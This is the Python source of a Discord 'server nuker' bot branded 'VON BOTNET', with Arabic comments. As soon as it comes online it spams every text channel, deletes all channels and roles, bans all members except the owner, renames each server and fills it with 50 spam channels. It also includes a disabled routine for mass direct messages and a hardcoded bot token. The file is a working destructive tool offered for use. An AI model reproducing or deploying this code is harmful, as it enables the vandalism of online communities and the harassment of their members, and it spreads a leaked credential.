# ============================================
# 💀 VON DESTROYER BOT - AUTO DESTROY 💀
# ============================================
# 🔥 AUTOMATIC DESTRUCTION ON START
# 🔥 DMS ALL MEMBERS + SPAM ALL CHANNELS
# 🔥 DELETES CHANNELS + ROLES + BANS
# 🔥 MAXIMUM DESTRUCTION - NO COMMANDS NEEDED
# ============================================

import discord
from discord.ext import commands
import asyncio
import random

# ============================================
# 🔥 CONFIGURATION
# ============================================

TOKEN = 'MTUzOTgxODE2NjUxODAyNjMwMA.Gq8kc_.uDkI8-rw9qrO1zlEicQhz8q6yQlFvyaBPMsnmk'

# رسائل التدمير
DESTROY_MESSAGES = [
    '💀 THIS SERVER HAS BEEN DESTROYED BY VON BOTNET',
    '🔥 VON BOTNET - SERVER TERMINATED',
    '💀 YOUR SERVER IS NOW UNDER VON CONTROL',
    '🔥 ALL YOUR BASE ARE BELONG TO VON',
    '💀 VON BOTNET - MAXIMUM DESTRUCTION',
    '🔥 THIS SERVER HAS BEEN COMPROMISED',
    '💀 VON BOTNET - GAME OVER',
    '🔥 SERVER DESTROYED - VON BOTNET'
]

SPAM_MESSAGES = [
    '💀 VON BOTNET DESTROYED THIS SERVER',
    '🔥 VON BOTNET - MAXIMUM POWER',
    '💀 THIS SERVER IS NOW OURS',
    '🔥 VON BOTNET - SERVER TERMINATED',
    '💀 ALL CHANNELS WILL BE DELETED',
    '🔥 VON BOTNET - INFINITE POWER',
    '💀 YOU HAVE BEEN DESTROYED',
    '🔥 VON BOTNET - GAME OVER'
]

# ============================================
# 🔥 BOT SETUP
# ============================================

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.dm_messages = True
intents.dm_typing = True

bot = commands.Bot(command_prefix='!', intents=intents)

# ============================================
# 🔥 DESTROY FUNCTIONS
# ============================================

async def dm_all_members(guild):
    """إرسال رسائل خاصة لجميع الأعضاء"""
    print(f'📨 Sending DMs to all members in {guild.name}...')
    count = 0
    
    for member in guild.members:
        if member == guild.owner:
            continue
        try:
            for i in range(5):
                msg = random.choice(DESTROY_MESSAGES) + f'\n🔹 Server: {guild.name}\n🔹 Owner: {guild.owner}\n🔹 Members: {guild.member_count}\n🔹 VON BOTNET'
                await member.send(msg)
                count += 1
                await asyncio.sleep(0.1)
        except:
            pass
    
    print(f'✅ DMs sent to {count} members')
    return count

async def spam_all_channels(guild):
    """سبام في جميع القنوات"""
    print(f'💬 Spamming all channels in {guild.name}...')
    count = 0
    
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                for i in range(20):
                    msg = random.choice(SPAM_MESSAGES) + f'\n🔹 VON BOTNET DESTROYING {guild.name}\n🔹 Channel: {channel.name}\n🔹 Count: {count}'
                    await channel.send(msg)
                    count += 1
                    await asyncio.sleep(0.05)
            except:
                pass
    
    print(f'✅ Spammed {count} messages')
    return count

async def delete_all_channels(guild):
    """حذف جميع القنوات"""
    print(f'🗑️ Deleting all channels in {guild.name}...')
    count = 0
    
    for channel in guild.channels:
        try:
            await channel.delete()
            count += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(f'✅ Deleted {count} channels')
    return count

async def delete_all_roles(guild):
    """حذف جميع الرتب"""
    print(f'🎭 Deleting all roles in {guild.name}...')
    count = 0
    
    for role in guild.roles:
        if role.name == '@everyone':
            continue
        try:
            await role.delete()
            count += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(f'✅ Deleted {count} roles')
    return count

async def ban_all_members(guild):
    """حظر جميع الأعضاء"""
    print(f'🚫 Banning all members in {guild.name}...')
    count = 0
    
    for member in guild.members:
        if member == guild.owner:
            continue
        try:
            await member.ban(reason='💀 VON BOTNET DESTROYED THIS SERVER')
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    
    print(f'✅ Banned {count} members')
    return count

async def create_spam_channels(guild):
    """إنشاء قنوات سبام"""
    print(f'📝 Creating spam channels in {guild.name}...')
    count = 0
    
    for i in range(50):
        try:
            channel = await guild.create_text_channel(f'💀-von-botnet-{i}')
            await channel.send(f'💀 VON BOTNET DESTROYED {guild.name}')
            count += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(f'✅ Created {count} spam channels')
    return count

async def change_server_settings(guild):
    """تغيير إعدادات السيرفر"""
    print(f'⚙️ Changing server settings in {guild.name}...')
    
    try:
        # تغيير اسم السيرفر
        await guild.edit(name=f'💀 DESTROYED BY VON BOTNET')
    except:
        pass
    
    try:
        # تغيير الصورة (إذا كان البوت لديه صلاحيات)
        pass
    except:
        pass

# ============================================
# 🔥 MAIN DESTROY FUNCTION
# ============================================

async def destroy_server(guild):
    """تدمير السيرفر بالكامل"""
    print(f'\n🔥 STARTING DESTRUCTION OF {guild.name} 🔥')
    print(f'📊 Members: {guild.member_count}')
    print(f'📊 Channels: {len(guild.channels)}')
    print(f'📊 Roles: {len(guild.roles)}')
    print('=' * 50)
    
    # 1. تغيير إعدادات السيرفر
    await change_server_settings(guild)
    
    # 2. إرسال رسائل خاصة للأعضاء (تم تعطيلها لتجنب الحظر السريع)
    # يمكن تفعيلها إذا أردت
    # await dm_all_members(guild)
    
    # 3. سبام في جميع القنوات
    await spam_all_channels(guild)
    
    # 4. حذف جميع القنوات
    await delete_all_channels(guild)
    
    # 5. حذف جميع الرتب
    await delete_all_roles(guild)
    
    # 6. حظر جميع الأعضاء
    await ban_all_members(guild)
    
    # 7. إنشاء قنوات سبام جديدة
    await create_spam_channels(guild)
    
    print('=' * 50)
    print(f'✅ DESTRUCTION OF {guild.name} COMPLETED!')
    print('💀 VON BOTNET - MAXIMUM POWER')

# ============================================
# 🔥 BOT STARTUP - AUTO DESTROY
# ============================================

@bot.event
async def on_ready():
    print(f'✅ Bot online: {bot.user.name}')
    print(f'🔥 AUTO-DESTROY MODE ACTIVATED')
    print(f'📌 Destroying all servers...')
    print('=' * 50)
    
    # تدمير جميع السيرفرات التي فيها البوت
    for guild in bot.guilds:
        try:
            await destroy_server(guild)
        except Exception as e:
            print(f'❌ Error destroying {guild.name}: {e}')
    
    print('\n💀 ALL SERVERS DESTROYED!')
    print('🔥 VON BOTNET - MAXIMUM DESTRUCTION')
    print('=' * 50)

# ============================================
# 🔥 RUN BOT
# ============================================

if __name__ == '__main__':
    try:
        print('''
    ╔══════════════════════════════════════════════════════════════════╗
    ║  💀 VON DESTROYER BOT - AUTO DESTROY                          ║
    ║  🔥 AUTOMATIC DESTRUCTION ON START                            ║
    ║  ⚡ MAXIMUM POWER - NO COMMANDS NEEDED                        ║
    ║  💀 ALL SERVERS WILL BE DESTROYED                             ║
    ╚══════════════════════════════════════════════════════════════════╝
        ''')
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        print('❌ Invalid token. Please check your Discord bot token.')
    except Exception as e:
        print(f'❌ An error occurred: {e}')
